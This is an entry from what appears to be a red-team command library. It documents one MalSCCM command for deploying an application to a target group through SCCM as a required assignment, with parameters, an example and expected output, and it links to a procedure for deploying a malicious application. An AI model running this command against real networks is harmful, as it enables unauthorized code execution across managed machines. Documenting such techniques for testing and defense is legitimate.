---
id: 23ae2976-9234-41ee-8c52-464f29a8f26f
type: command
executor: powershell
data: >-
  MalSCCM.exe app /deploy /name:$_APP_NAME /groupname:$_GROUP_NAME
  /assignmentname:$_ASSIGNMENT_NAME
output: null
created_at: '2023-04-06T03:56:08.126665+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - sccm
  - execution
verified: true
validated: true
---

# Deploy-application-to-target-group-using-MalSCCM

## Command

```powershell
MalSCCM.exe app /deploy /name:$_APP_NAME /groupname:$_GROUP_NAME /assignmentname:$_ASSIGNMENT_NAME
```

## Description

Deploys an application to a specified group as a required assignment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /name:$_APP_NAME | Application to deploy | Yes |
| /groupname:$_GROUP_NAME | Target group | Yes |
| /assignmentname:$_ASSIGNMENT_NAME | Deployment name | Yes |

## Examples

### Basic Usage

```powershell
MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
```

## Expected Output

Deployment 'demodeployment' created for 'TargetGroup'.

Success message.

## Related

- [[procedures/Create-and-Deploy-Malicious-Application-via-SCCM]]
